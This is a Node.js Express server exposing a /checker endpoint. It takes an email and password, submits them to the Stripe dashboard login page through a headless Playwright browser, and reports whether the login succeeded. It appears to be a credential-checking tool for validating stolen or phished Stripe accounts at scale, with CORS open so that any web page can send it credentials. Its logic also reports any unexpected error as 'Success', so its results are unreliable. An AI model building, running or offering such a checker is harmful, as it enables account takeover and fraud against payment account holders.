const { chromium } = require('playwright');
const {expect} = require("@playwright/test");
const cors = require('cors');
const bodyParser = require('body-parser')
const express = require('express');
const app = express()
const port = 3000
let jsonParser = bodyParser.json();
app.use(cors());

app.post('/checker', jsonParser, (req, res) => {
  const {email, password} = req.body;
  (async () => {
  const browser = await chromium.launch({headless: true});
  const page = await browser.newPage();

  await page.goto('https://dashboard.stripe.com/login');
  await page.locator("#email").fill(email)
  await page.locator("#old-password").fill(password)
  await page.locator('//*[@id="​"]/body/div[1]/div/div/div[1]/div[2]/div/div[2]/div/div/div/div/div/div/div[2]/form/div/div/div/div[4]/div/div/div/div/div/div[1]/button').click()
  await expect(page.locator('//*[@id="​"]/body/div[1]/div/div/div[1]/div[2]/div/div[2]/div/div/div/div/div/div/div[2]/form/div/div/div/div[3]/div/div/div[1]/div/div[3]/div/div/div/div[2]/span')).toContainText("Incorrect email or password.").then(() => {
    res.setHeader('Content-Type', 'application/json');
    res.send(JSON.stringify({msg: 'Incorrect email or password'}));
  }).catch(() => res.send(JSON.stringify({msg: 'Success'})))
  await page.close();
})();
 
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})

